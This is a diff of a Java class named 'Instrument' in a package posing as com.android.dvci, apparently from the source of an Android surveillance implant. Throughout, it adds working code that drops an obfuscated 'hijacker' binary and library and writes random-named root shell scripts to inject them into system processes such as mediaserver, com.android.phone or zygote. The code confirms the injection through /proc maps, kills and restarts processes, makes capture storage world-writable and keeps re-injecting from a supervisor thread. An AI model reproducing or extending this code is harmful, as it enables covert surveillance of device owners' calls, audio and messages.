@@ -4,48 +4,122 @@ import com.android.dvci.Beep;
 import com.android.dvci.Root;
 import com.android.dvci.Status;
 import com.android.dvci.auto.Cfg;
-import com.android.dvci.conf.Configuration;
 import com.android.dvci.evidence.EvidenceBuilder;
+import com.android.dvci.evidence.Markup;
 import com.android.dvci.file.AutoFile;
+import com.android.dvci.file.Path;
 import com.android.mm.M;
 
 import java.io.File;
-import java.io.FileInputStream;
-import java.io.IOException;
-import java.nio.ByteBuffer;
-import java.nio.ByteOrder;
+import java.util.ArrayList;
+import java.util.Date;
+import java.util.concurrent.Semaphore;
 import java.util.concurrent.TimeUnit;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
 
-public class Instrument {
+
+/*
+ * todo: migliorare l'inserimento dell'instrumentation, gestione degli stati e degli errori
+ */
+public class Instrument implements Runnable{
 	private static final String TAG = "Instrument";
-	private static final int MAX_KILLED = 3;
+	private static final int MAX_KILLED = 5;
+	private String proc_owner = null;
+	private String dex_dest = null;
 	private String proc;
-	private MediaserverMonitor pidMonitor;
-	private static String lib, hijacker, path, dumpPath, pidCompletePath, pidFile;
-	private boolean stopMonitor = false;
-
-	private Thread monitor;
+	private PidMonitor pidMonitor;
+	private String lib_dest, hijacker, path, dumpPath, dexFile, libInAsset;
+	private static String storage = "";
+	private Semaphore sync_semaphore =null;
+	private Thread pidMonitorThread;
 	private int killed = 0;
-	private String lid = M.e(" lid ");
+	private int istrumentation_failures = 0;
+	private int restartedCounter = 0;
+	private boolean started = false;
+	private String instrumentationSuccessDir = null;
+	private boolean instSupervisorContinue = false;
+	private boolean threadRunning = false;
+	private Thread instSupervisor = null;
+	private ArrayList<String> argList = new ArrayList<String>();
+	private int timeout = 180;
 
-	public Instrument(String process, String dump) {
+
+	public Instrument(String process, String dump,Semaphore sem,String library,String owner) {
 		final File filesPath = Status.getAppContext().getFilesDir();
-
 		proc = process;
-
-		hijacker = "m";
-		lib = "n";
+		proc_owner = owner;
+		hijacker = String.valueOf(Math.abs((int)Utils.getRandom()))+"m";
+		libInAsset = library;
+		lib_dest = Markup.makeMarkupName(library, false);
 		path = filesPath.getAbsolutePath();
 		dumpPath = dump;
-		pidFile = M.e("irg");
-		pidCompletePath = path + "/" + pidFile;
+		sync_semaphore = sem;
+		istrumentation_failures = 0;
+	}
+	public Instrument(String process, String dump,Semaphore sem,String library,String _dexFile,String owner) {
+		this(process,dump,sem,library,owner);
+		if(_dexFile!=null) {
+			dexFile = _dexFile;
+			dex_dest = "d" + dexFile.hashCode();
+		}
+	}
+
+	public Instrument(String process, String dump, Semaphore sem, String library) {
+		this(process,dump,sem,library,null);
+	}
+
+	public String getInstrumentationSuccessDir() {
+		return instrumentationSuccessDir;
+	}
+
+	public void setInstrumentationSuccessDir(String storageDirName,boolean autoCreate) {
+		this.instrumentationSuccessDir = storageDirName;
+		if(autoCreate) {
+			createMsgStorage();
+		}
+	}
+
+	/**
+	 * Modify the default timeouts (180 seconds) used
+	 * when startInstrumentation is called
+	 * @param timeout in seconds
+	 */
+	public void setTimeout(int timeout) {
+		this.timeout = timeout;
+	}
+
+	public boolean trialsBelowLimits(){
+		return killed<MAX_KILLED && istrumentation_failures<MAX_KILLED;
+	}
+	public boolean createMsgStorage() {
+		// Create storage directory
+
+		if (Path.createDirectory(this.instrumentationSuccessDir) == false) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (createMsgStorage): audio storage directory cannot be created"); //$NON-NLS-1$
+			}
+
+			return false;
+		} else {
+			Execute.chmod(M.e("777"), this.instrumentationSuccessDir);
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (createMsgStorage): audio storage directory created at " + this.instrumentationSuccessDir); //$NON-NLS-1$
+			}
+
+			return true;
+		}
+	}
+	public boolean isStarted() {
+		return started;
 	}
 
 	private boolean deleteHijacker() {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (installHijacker) delete lib");
+			Check.log(TAG + " (installHijacker) delete lib_dest");
 		}
-		AutoFile file = new AutoFile(Status.getAppContext().getFilesDir(), lib);
+		AutoFile file = new AutoFile(Status.getAppContext().getFilesDir(), lib_dest);
 		file.delete();
 		file = new AutoFile(Status.getAppContext().getFilesDir(), hijacker);
 		file.delete();
@@ -62,12 +136,27 @@ public class Instrument {
 				return false;
 			}
 
-			Utils.dumpAsset(M.e("ib.data"), lib);
-			Utils.dumpAsset(M.e("mb.data"), hijacker);
+			Utils.dumpAsset(libInAsset, lib_dest);
+			if (android.os.Build.VERSION.SDK_INT > 20) {
+				Utils.dumpAsset(M.e("mbL.data"), hijacker);
+			}else{
+				Utils.dumpAsset(M.e("mb.data"), hijacker);
+			}
+			if(dexFile!= null){
+				File src = new File(path + "/" + dex_dest);
+				Utils.dumpAsset(dexFile, dex_dest);
+				Execute.chmod(M.e("750"), path + "/" + dex_dest);
+				Utils.copy(src,new File(dumpPath + "/" + dex_dest));
+				Execute.chmod(M.e("777"), dumpPath + "/" + dex_dest);
+				src.delete();
+			}
 
 			// Install library
-			Execute.chmod(M.e("666"), path + "/" + lib);
+			Execute.chmod(M.e("666"), path + "/" + lib_dest);
 			Execute.chmod(M.e("750"), path + "/" + hijacker);
+			if(getInstrumentationSuccessDir()== null) {
+				setInstrumentationSuccessDir(dumpPath,true);
+			}
 
 		} catch (Exception e) {
 			if (Cfg.EXCEPTION) {
@@ -88,48 +177,113 @@ public class Instrument {
 
 			return false;
 		}
+		if ( timeout<=0 ){
+			timeout = 180;
+		}
+		Date start = new Date();
+		long diff_sec = 0;
+		while(diff_sec<timeout && trialsBelowLimits() ) {
+			try {
+				if (_startInstrumentation()) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + "(startInstrumentation): " + proc + " Done");
+					}
+					break;
+				}
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(startInstrumentation): " + proc + " failed, try again");
+				}
+				istrumentation_failures++;
+			}catch (InterruptedException e){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(startInstrumentation): semaphore not acquire, do not increment failures");
+				}
+			}
+			Utils.sleep(500);
+			diff_sec = (new Date().getTime() - start.getTime()) / 1000;
+		}
+		if(diff_sec>timeout) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(startInstrumentation): " + proc + "Time out sec=" + timeout);
+			}
+		}
 
+		return isStarted();
+	}
+
+	private boolean _startInstrumentation() throws InterruptedException {
+		if(!trialsBelowLimits()){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(_startInstrumentation): too many trials");
+			}
+			return false;
+		}
 		if (!installHijacker()) {
 			return false;
 		}
 
+
 		try {
-			if(Status.self().semaphoreMediaserver.tryAcquire(10, TimeUnit.SECONDS)) {
+			if(sync_semaphore == null || sync_semaphore.tryAcquire(Utils.getRandom(10), TimeUnit.SECONDS)) {
 				try {
-					int pid = getProcessPid(proc);
+					int pid = getProcessPid(proc, proc_owner);
 
 					if (pid > 0) {
 						// Run the injector
-						String scriptName = "ij";
+						String scriptName = String.valueOf(Math.abs((int)Utils.getRandom()))+"ij";
 						String script = M.e("#!/system/bin/sh") + "\n";
-						script += path + "/" + hijacker + " -p " + pid + " -l " + path + "/" + lib + " -f " + dumpPath + "\n";
+						script += M.e("rm ")+ getInstrumentationSuccessDir() +M.e("*.cnf") + M.e(" >/dev/null\n");
 
+						String farg =" ";
+						if( !StringUtils.isEmpty(dumpPath)) {
+							farg += "-f " + dumpPath+" ";
+							if ( !StringUtils.isEmpty(dexFile)) {
+								farg +="-f " + dex_dest+" ";
+							}
+							for( String arg : argList){
+								farg +="-f " + arg+" ";
+							}
+						}
+						script += path + "/" + hijacker + " -p " + pid + " -l " + path + "/" + lib_dest + farg ;
+						if (Cfg.DEBUG) {
+							script += " -d ";
+						}
+						script += "\n";
 						Root.createScript(scriptName, script);
 						ExecuteResult ret = Execute.executeRoot(path + "/" + scriptName);
 						if (Cfg.DEBUG) {
-							Check.log(TAG + " (startInstrumentation) exit code: " + ret.exitCode);
+							Check.log(TAG + " (startInstrumentation) "+proc+" output: ");
+							for( String s : ret.stdout )
+							{
+								Check.log(TAG + " "+s);
+							}
+							Check.log(TAG + " (startInstrumentation) "+proc+" exit code: " + ret.exitCode);
 						}
 
 						Root.removeScript(scriptName);
 
 						Utils.sleep(2000);
-						int newpid = getProcessPid(proc);
+						int newpid = getProcessPid(proc,proc_owner);
 						if (newpid != pid) {
 							if (Cfg.DEBUG) {
-								Check.log(TAG + " (startInstrumentation) Error: mediaserver was killed");
+								Check.log(TAG + " (_startInstrumentation) Error: "+proc+" was killed");
 							}
+							return false;
 						}
 
-						File d = new File(dumpPath);
+						File d = new File(getInstrumentationSuccessDir());
 
-						boolean started = false;
+						started = false;
 
 						for (int i = 0; i < 5 && !started; i++) {
 							File[] files = d.listFiles();
+							if ( files == null ){
+								break;
+							}
 							for (File file : files) {
 								if (file.getName().endsWith(M.e(".cnf"))) {
 									if (Cfg.DEBUG) {
-										Check.log(TAG + " (startInstrumentation) got file: " + file.getName());
+										Check.log(TAG + " (_startInstrumentation) got file: " + file.getName());
 									}
 									started = true;
 									file.delete();
@@ -142,142 +296,121 @@ public class Instrument {
 							}
 							if (!started) {
 								if (Cfg.DEBUG) {
-									Check.log(TAG + " (startInstrumentation) sleep 5 secs");
+									Check.log(TAG + " (_startInstrumentation) sleep 1 secs "+proc);
 								}
-								Utils.sleep(2000);
+								Utils.sleep(1000);
 							}
 						}
-
-						if (!started && killed < MAX_KILLED) {
+						if (started) {
 							if (Cfg.DEBUG) {
-								Check.log(TAG + " (startInstrumentation) Kill mediaserver");
+								Check.log(TAG + " (_startInstrumentation) "+proc+" Hijack installed");
+							}
+							EvidenceBuilder.info(proc + M.e(" injected"));
+							checkProcessMonitor(true);
+						}else if (trialsBelowLimits()) {
+							if (Cfg.DEBUG) {
+								Check.log(TAG + " (_startInstrumentation) Kill "+proc);
 							}
 							killProc(proc);
-							// Utils.sleep(1000);
-							// newpid = getProcessPid();
 							killed += 1;
-
-							if (started) {
-								if (Cfg.DEBUG) {
-									Check.log(TAG + " (startInstrumentation) Audio Hijack installed");
-								}
-								EvidenceBuilder.info(M.e("Audio injected"));
-							}
-
-							stopMonitor = false;
-						}
-
-						if (pidMonitor == null) {
-							if (Cfg.DEBUG) {
-								Check.log(TAG + " (startInstrumentation) script: \n" + script);
-								Check.log(TAG + "(startInstrumentation): Starting MeadiaserverMonitor thread");
-							}
-
-							pidMonitor = new MediaserverMonitor(newpid);
-							monitor = new Thread(pidMonitor);
-							monitor.start();
-						} else {
-							pidMonitor.setPid(newpid);
 						}
 					} else {
 						if (Cfg.DEBUG) {
-							Check.log(TAG + "(getProcessPid): unable to get pid");
+							Check.log(TAG + "(_startInstrumentation): unable to get pid for "+ proc);
 						}
-
 					}
 				} catch (Exception e) {
 					if (Cfg.DEBUG) {
-						Check.log(TAG + " (startInstrumentation) Error: " + e);
+						Check.log(TAG + " (_startInstrumentation) Error: "+ proc , e);
 					}
 					return false;
 				} finally {
 					deleteHijacker();
 					Utils.sleep(2000);
-					Status.self().semaphoreMediaserver.release();
+					if(sync_semaphore != null) {
+						sync_semaphore.release();
+					}
 				}
+			}else{
+				return false;
 			}
 		} catch (InterruptedException e) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (startInstrumentation) Error: " + e);
+				Check.log(TAG + " (_startInstrumentation) Error: "+proc + e);
 			}
-			return false;
+			throw e;
 		}
 
-		return true;
+		return started;
 	}
 
 	public void stopInstrumentation() {
-		stopMonitor = true;
-		monitor = null;
-		int trials=5;
-		int pid_start = getProcessPid(proc);
+
+		int trials=MAX_KILLED;
+		int pid_start = getProcessPid(proc,proc_owner);
 		int pid_stop = pid_start;
+		if ( pidMonitor != null ){
+			pidMonitor.setStopMonitor(true);
+		}
 
 		while(trials-->0 && pid_start==pid_stop) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (stopInstrumentation) trials: " + trials);
+				Check.log(TAG + " (stopInstrumentation "+proc+") trials: " + trials);
 			}
 
 			try {
-				Status.self().semaphoreMediaserver.tryAcquire(10, TimeUnit.SECONDS);
-
-				try {
+				if(sync_semaphore != null) {
+					sync_semaphore.tryAcquire(Utils.getRandom(10), TimeUnit.SECONDS);
+					try {
+						killProc(proc);
+					} finally {
+							sync_semaphore.release();
+					}
+				}else{
 					killProc(proc);
-					Utils.sleep(2000);
-				}finally {
-					Status.self().semaphoreMediaserver.release();
 				}
 
 			} catch (InterruptedException e) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (stopInstrumentation) Error: " + e);
-					Check.log(TAG + " (stopInstrumentation) Interrupted when trying to restore mediaserver");
+					Check.log(TAG + " (stopInstrumentation "+proc+") Error: " + e);
+					Check.log(TAG + " (stopInstrumentation "+proc+") Interrupted when trying to restore "+ proc);
 				}
 			}
-			pid_stop = getProcessPid(proc);
+			pid_stop = getProcessPid(proc,proc_owner);
+		}
+		if(pid_start != pid_stop){
+			started = false;
 		}
 	}
 
-	private int getProcessPid(String process) {
-		int pid;
-		byte[] buf = new byte[4];
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (getProcessPid) " + process + " " + pidCompletePath);
-		}
-		Execute.execute(Configuration.shellFile + lid + process + " " + pidCompletePath);
-
-		try {
-			FileInputStream fis = Status.getAppContext().openFileInput(pidFile);
-
-			fis.read(buf);
-			fis.close();
-
-			// Remove PID file
-			File f = new File(pidCompletePath);
-			f.delete();
-
-			// Parse PID from the file
-			ByteBuffer bbuf = ByteBuffer.wrap(buf);
-			bbuf.order(ByteOrder.LITTLE_ENDIAN);
-			pid = bbuf.getInt();
-		} catch (IOException e) {
-			if (Cfg.EXCEPTION) {
-				Check.log(e);
+	private int getProcessPid(String process,String proc_owner) {
+		int pid = -1;
+		String pid_s = Utils.pidOf(process, proc_owner);
+		if(pid_s != null){
+			try{
+				pid = Integer.valueOf(pid_s);
+			}catch (Exception e){
+				pid=-1;
 			}
-
-			return 0;
 		}
-
 		return pid;
 	}
 
 	public void killProc(String process) {
 		try {
-			int pid = getProcessPid(process);
+			int pid = getProcessPid(process,proc_owner);
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (killProc) try to kill " + pid);
 			}
-			Execute.executeRoot("kill " + pid);
+			if (proc.equalsIgnoreCase(M.e("zygote"))){
+				String scriptName = String.valueOf(Math.abs((int)Utils.getRandom()))+"kk";
+				String script = M.e("#!/system/bin/sh") + "\n";
+				script += M.e("stop zygote") + "\n";
+				script += M.e("start zygote") + "\n";
+				Execute.executeRootAndForgetScript(script);
+			}else {
+				Execute.executeRoot(M.e("kill ") + pid);
+			}
 		} catch (Exception ex) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (killProc) Error: " + ex);
@@ -285,49 +418,295 @@ public class Instrument {
 		}
 	}
 
-	class MediaserverMonitor implements Runnable {
+	public void  checkProcessMonitor(boolean initialize) {
+		int newpid = 0;
+		if (Cfg.DEBUG) {
+			Check.log(TAG + "(checkProcessMonitor): initialize " + initialize);
+		}
+		if (initialize ) {
+			newpid = getProcessPid(proc, proc_owner);
+		}
+		if (pidMonitor == null) {
+			newpid = getProcessPid(proc, proc_owner);
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(checkProcessMonitor): Starting "+proc+ " Monitor thread");
+			}
+			pidMonitor = new PidMonitor(newpid);
+			pidMonitorThread = new Thread(pidMonitor);
+			if (Cfg.DEBUG) {
+				pidMonitorThread.setName("pidMonitorThread");
+			}
+			pidMonitorThread.start();
+		} else {
+			if( initialize) {
+				pidMonitor.setPid(newpid);
+			}else{
+				if( pidMonitorThread != null && pidMonitorThread.getState() == Thread.State.TERMINATED ){
+					if (Cfg.DEBUG) {
+						Check.log(TAG + "(checkProcessMonitor): pidMonitorThread thread terminated ! restart a new one");
+					}
+					pidMonitor.setStopMonitor(false);
+					pidMonitor.setPid(newpid);
+					pidMonitorThread = new Thread(pidMonitor);
+					if (Cfg.DEBUG) {
+						pidMonitorThread.setName("pidMonitorThread");
+					}
+					pidMonitorThread.start();
+				}
+			}
+
+		}
+	}
+
+	public int getRestartCounter() {
+		return restartedCounter;
+	}
+
+	public void setRestartCounter(int counter) {
+		restartedCounter = counter;
+	}
+
+	/**
+	 * Indicates if the main thread is running
+	 * @return threadRunning
+	 */
+
+	public synchronized boolean isThreadRunning() {
+		return threadRunning ;
+	}
+
+	public synchronized void setThreadRunning(boolean threadRunning) {
+		this.threadRunning = threadRunning;
+	}
+
+	public void stop() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (stop): starting"); //$NON-NLS-1$
+		}
+		if( Status.haveRoot() && this.instSupervisor != null) {
+			instSupervisorContinue = false;
+			Date start = new Date();
+			long diff_sec = (new Date().getTime() - start.getTime()) / 1000;
+			while (diff_sec < 60) {
+				diff_sec = (new Date().getTime() - start.getTime()) / 1000;
+				try {
+					if (isStarted()) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (stop): something wrong instrumentation still active, stop it"); //$NON-NLS-1$
+						}
+						stopInstrumentation();
+					}
+					this.instSupervisor.join(500);
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (stop): join return ts="+ this.instSupervisor.getState()); //$NON-NLS-1$
+					}
+					if(this.instSupervisor.getState() == Thread.State.TERMINATED) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (stop): joined "); //$NON-NLS-1$
+						}
+						this.instSupervisor = null;
+						break;
+					}
+				} catch (Exception e) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (stop): failed to join thread"); //$NON-NLS-1$
+					}
+				}
+				Utils.sleep(500);
+			}
+			if(isThreadRunning()){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (stop): failed to stop thread"); //$NON-NLS-1$
+				}
+				EvidenceBuilder.info(M.e("Instrument "+ proc +" failed to stop"));
+			}else{
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (stop): OK"); //$NON-NLS-1$
+				}
+				EvidenceBuilder.info(M.e("Instrument "+ proc + " correctly stopped"));
+
+			}
+		}
+	}
+	@Override
+	public void run() {
+		setThreadRunning(true);
+		while(instSupervisorContinue) {
+			if (Status.haveRoot()) {
+				if (! isStarted()) {
+					startInjection();
+				}else {
+					checkProcessMonitor(false);
+				}
+			}
+			if(!trialsBelowLimits()){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(run): too many kill stopping..");
+					instSupervisorContinue = false ;
+				}
+			}
+			Utils.sleep(5000);
+		}
+		if (Cfg.DEBUG) {
+			Check.log(TAG + "(run): asked to stop");
+		}
+		try {
+			if(isStarted()) {
+				stopInstrumentation();
+			}
+		}catch (Exception e){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(run): failed to stopInstrumentation");
+			}
+		}
+		setThreadRunning(false);
+	}
+
+
+	public void start() {
+
+		if (isThreadRunning()) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(start): thread ALREADY running");
+			}
+		} else {
+			instSupervisorContinue = true;
+			if (instSupervisor == null) {
+				instSupervisor = new Thread(this);
+				if (Cfg.DEBUG) {
+					instSupervisor.setName("Instrument supervisor");
+				}
+			}
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(start): starting thread");
+			}
+			instSupervisor.start();
+		}
+	}
+
+	public  boolean startInjection() {
+		/*
+		 * Hypothesis : modules that relay on the com.android.phone , i.e. ModuleMessages, ModuleCall can have problem
+		 * in case the process is killed while used?
+		 */
+		if(trialsBelowLimits()) {
+			if(alreadyInjected()) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(startInjection):process already injected kill it first");
+				}
+				stopInstrumentation();
+			}else{
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(startInjection): no need to stop");
+				}
+			}
+			if (isStarted()) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(startInjection): hijacker already running");
+				}
+				return true;
+			}
+			if (startInstrumentation()) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(startInjection): hijacker successfully installed");
+				}
+
+				return true;
+			} else {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(startInjection): hijacker cannot be installed");
+				}
+			}
+		}else{
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(startInjection): hijacker cannot be installed too many trials");
+			}
+			EvidenceBuilder.info(M.e("injection " + proc +" cannot be installed,too many trials"));
+		}
+		return false;
+	}
+
+	private boolean alreadyInjected() {
+		int pid = getProcessPid(proc, proc_owner);
+		//read /proc/%pid/maps and checks for lib_dest process
+		Pattern pattern = Pattern.compile(lib_dest);
+		ExecuteResult ret = Execute.executeRoot(M.e("cat /proc/") + pid + "/" + M.e("maps "));
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (alreadyInjected) " + proc + " output: ");
+		}
+		for (String s : ret.stdout) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " " + s);
+			}
+			Matcher matcher = pattern.matcher(s);
+			if (matcher.find()) {
+				return true;
+			}
+		}
+		return false;
+	}
+
+	public void addArg(String arg) {
+		if (!StringUtils.isEmpty(arg)){
+			argList.add(arg);
+		}
+	}
+
+
+	class PidMonitor implements Runnable {
 		private int cur_pid, start_pid;
 		private int failedCounter = 0;
+		private boolean stopMonitor = false;
+
+		public void setStopMonitor(boolean stopMonitor) {
+			this.stopMonitor = stopMonitor;
+		}
 
 		public void setPid(int pid) {
 			start_pid = pid;
 		}
 
-		public MediaserverMonitor(int pid) {
+		public PidMonitor(int pid) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + "(MediaserverMonitor): starting with pid " + pid);
+				Check.log(TAG + "(PidMonitor): starting with pid " + pid + "for proc=" + proc);
 			}
-
+			stopMonitor = false;
 			setPid(pid);
 		}
 
 		@Override
 		public void run() {
 			while (true) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(PidMonitor "+ proc +" run): killed="+ killed +" restarted="+ restartedCounter);
+				}
 
 				if (stopMonitor) {
 					if (Cfg.DEBUG) {
-						Check.log(TAG + "(MediaserverMonitor run): closing monitor thread");
+						Check.log(TAG + "(PidMonitor "+proc+" run): closing pidMonitorThread thread");
 					}
 
 					stopMonitor = false;
+					pidMonitorThread = null;
+					pidMonitor = null;
 					return;
 				}
 
-				cur_pid = getProcessPid(proc);
+				cur_pid = getProcessPid(proc,proc_owner);
 
-				// Mediaserver died
+				// process died
 				if (cur_pid != start_pid) {
 					if (Cfg.DEBUG) {
-						Check.log(TAG + "(MediaserverMonitor run): Mediaserver died, restarting instrumentation");
+						Check.log(TAG + "(PidMonitor "+proc+" run): died, restarting instrumentation");
 					}
 
 					failedCounter += 1;
-					if (failedCounter < 3) {
+					if (failedCounter < MAX_KILLED) {
 						startInstrumentation();
+						restartedCounter++;
 					} else {
 						if (Cfg.DEBUG) {
-							Check.log(TAG + " (run) too many retry, sto restart mediaserver");
+							Check.log(TAG + "(PidMonitor "+proc+" run): too many retry, stop restarting ");
 						}
 					}
 				} else {
